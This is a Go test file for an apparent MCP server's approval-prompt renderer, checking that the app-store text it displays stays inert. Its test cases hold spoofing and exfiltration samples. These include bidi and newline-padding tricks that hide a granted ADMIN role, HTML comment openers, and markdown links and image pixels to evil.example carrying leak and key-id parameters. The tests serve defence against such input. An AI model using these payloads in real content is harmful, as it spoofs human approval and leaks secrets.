package tool

import (
	"strings"
	"testing"
)

// TestApprovalPromptIS2Spoof: forged server lines and bidi characters in
// untrusted text stay inside the fence on one line.
func TestApprovalPromptIS2Spoof(t *testing.T) {
	p := PlanPreview{
		Summary:      "reply to 1 review",
		Affected:     []string{"POST /v1/customerReviewResponses"},
		Intended:     map[string]string{"reply": "Thanks\u202E!"},
		Irreversible: []string{"the reply is public"},
		Untrusted:    []string{is2Payload},
		Warnings:     []string{"Reply contains link/email: \"evil.example\" — confirm it is yours"},
	}
	got, err := ApprovalPrompt("reviews_reply", "main", p)
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(got, "\n")
	count := func(prefix string) int {
		n := 0
		for _, l := range lines {
			if strings.HasPrefix(l, prefix) {
				n++
			}
		}
		return n
	}
	if count("Approve?") != 1 || lines[len(lines)-1] != "Approve?" {
		t.Errorf("Approve? must be the single last line:\n%s", got)
	}
	if count("Irreversible:") != 1 || count("Change:") != 1 {
		t.Errorf("forged server lines escaped the fence:\n%s", got)
	}
	if strings.ContainsAny(got, "\u202E\u200B\U000E0049") {
		t.Errorf("raw invisible characters in prompt:\n%q", got)
	}
	order := []string{"app-store-connect-mcp reviews_reply wants to:", "Profile: `main`", "Irreversible:", "Notes: `Reply contains link/email", "Targets:", "Untrusted third-party text", "Change:", "Approve?"}
	at := -1
	for _, want := range order {
		i := strings.Index(got, "\n"+want)
		if want == order[0] {
			i = strings.Index(got, want)
		}
		if i <= at {
			t.Fatalf("%q out of order:\n%s", want, got)
		}
		at = i
	}
}

// TestApprovalPromptCD2Padding: newline padding, NBSP and bidi in an
// interpolated summary cannot push the real role out of view.
func TestApprovalPromptCD2Padding(t *testing.T) {
	email := "ann@example.com" + strings.Repeat("\n", 60) + "\u00a0\u202Eviewer"
	p := PlanPreview{
		Summary:  "invite " + email + " as ADMIN",
		Affected: []string{"POST /v1/userInvitations", email},
		Intended: map[string]any{"roles": []string{"ADMIN"}},
	}
	got, err := ApprovalPrompt("users_invite", "", p)
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(got, "\n")
	if !strings.HasPrefix(lines[0], "app-store-connect-mcp users_invite wants to: `invite ann@example.com⏎⏎") ||
		!strings.Contains(lines[0], "as ADMIN") {
		t.Errorf("summary not on one line: %q", lines[0])
	}
	if !strings.Contains(strings.Join(lines[:min(5, len(lines))], "\n"), "ADMIN") {
		t.Errorf("role not within the first 5 lines:\n%s", got)
	}
	if strings.ContainsRune(got, '\u202E') {
		t.Errorf("raw U+202E in prompt")
	}
}

// outsideLiterals returns prompt without its fenced code blocks and inline
// code spans: the text a markdown renderer would still interpret.
func outsideLiterals(t *testing.T, prompt string) string {
	t.Helper()
	var out strings.Builder
	lines := strings.Split(prompt, "\n")
	for i := 0; i < len(lines); i++ {
		l := lines[i]
		if strings.HasPrefix(l, "```") {
			fence := l[:len(l)-len(strings.TrimLeft(l, "`"))]
			j := i + 1
			for j < len(lines) && lines[j] != fence {
				j++
			}
			if j == len(lines) {
				t.Fatalf("unclosed fence %q:\n%s", fence, prompt)
			}
			i = j
			continue
		}
		for l != "" {
			k := strings.IndexByte(l, '`')
			if k < 0 {
				out.WriteString(l)
				break
			}
			out.WriteString(l[:k])
			n := len(l[k:]) - len(strings.TrimLeft(l[k:], "`"))
			rest, closed := l[k+n:], false
			for p := 0; p < len(rest); {
				if rest[p] != '`' {
					p++
					continue
				}
				m := len(rest[p:]) - len(strings.TrimLeft(rest[p:], "`"))
				if m == n {
					l, closed = rest[p+m:], true
					break
				}
				p += m
			}
			if !closed {
				t.Fatalf("unclosed code span in %q", lines[i])
			}
		}
		out.WriteString("\n")
	}
	return out.String()
}

// TestApprovalPromptInertValues (PI1–PI3): branch names, reply bodies,
// promotional text and app names cannot hide server lines, form links or
// images, or trigger a fetch under plain-text, markdown or HTML rendering;
// server warnings precede every value and Approve? is the last line.
func TestApprovalPromptInertValues(t *testing.T) {
	cases := map[string]PlanPreview{
		"fork branch": {
			Summary:      `start Xcode Cloud workflow "Release" on pull request "#12"`,
			Affected:     []string{`pull request #12 from fork "evil/app", branch "fix-crash<!--" (P12)`},
			Irreversible: []string{"runs ci_scripts from this PR with the workflow's secrets and signing"},
			Warnings:     []string{"a human must approve this pull request build in the client"},
			Untrusted:    []string{"fix crash --> <img src=https://evil.example/px>"},
		},
		"reply link": {
			Summary:      "reply to 1 review [Thanks](https://evil.example/?d=leak)",
			Affected:     []string{"POST /v1/customerReviewResponses"},
			Intended:     []map[string]string{{"reply": "[Thanks for the feedback!](https://evil.example/?d=leak)"}},
			Irreversible: []string{"the reply is public"},
			Untrusted:    []string{"[Thanks](https://evil.example/?d=leak)"},
		},
		"promo image": {
			Summary:      "update promotional text ![](https://evil.example/px)",
			Intended:     map[string]string{"promotionalText": "![](https://evil.example/px?k=KEYID_ABC123)"},
			Irreversible: []string{"promotional text goes live immediately"},
		},
		"app name comment": {
			Summary:      "update 1 app info field(s) of Sikt <!--",
			Affected:     []string{"Sikt <!--", "`` ` ![x](https://evil.example/px) `"},
			Irreversible: []string{"the copyright line is public"},
			Warnings:     []string{"a note naming <b>Sikt</b> & co"},
		},
	}
	for name, p := range cases {
		t.Run(name, func(t *testing.T) {
			got, err := ApprovalPrompt("metadata_apply", "main", p)
			if err != nil {
				t.Fatal(err)
			}
			if strings.ContainsAny(got, "<>&") {
				t.Errorf("raw HTML-active character in prompt:\n%s", got)
			}
			outside := outsideLiterals(t, got)
			for _, bad := range []string{"](", "![", "<", "http"} {
				if strings.Contains(outside, bad) {
					t.Errorf("%q outside the inert literals:\n%s", bad, outside)
				}
			}
			if !strings.HasSuffix(got, "\nApprove?") || strings.Count(got, "Approve?") != 1 {
				t.Errorf("Approve? must be the single last line:\n%s", got)
			}
			warn := strings.Index(got, "\nIrreversible:")
			if warn < 0 {
				t.Fatalf("no Irreversible line:\n%s", got)
			}
			for _, value := range []string{"\nTargets:", "\nUntrusted third-party text", "\nChange:"} {
				if i := strings.Index(got, value); i >= 0 && i < warn {
					t.Errorf("%q precedes the server warnings:\n%s", value, got)
				}
			}
			if n := strings.Index(got, "\nNotes:"); n >= 0 && n < warn {
				t.Errorf("Notes precede Irreversible:\n%s", got)
			}
		})
	}
	got, _ := ApprovalPrompt("xcc_build_start", "", cases["fork branch"])
	if !strings.Contains(got, "fix-crash⟨U+003C⟩!--") {
		t.Errorf("branch not shown literally:\n%s", got)
	}
}

func TestInlineLiteral(t *testing.T) {
	for in, want := range map[string]string{
		"":           `""`,
		"plain":      "`plain`",
		"a`b":        "``a`b``",
		"`x":         "`` `x ``",
		" x ":        "`  x  `",
		"a<b>&c":     "`a⟨U+003C⟩b⟨U+003E⟩⟨U+0026⟩c`",
		"x ``` y":    "````x ``` y````",
		"[a](b) ![]": "`[a](b) ![]`",
	} {
		if got := inlineLiteral(in); got != want {
			t.Errorf("inlineLiteral(%q) = %q, want %q", in, got, want)
		}
	}
}
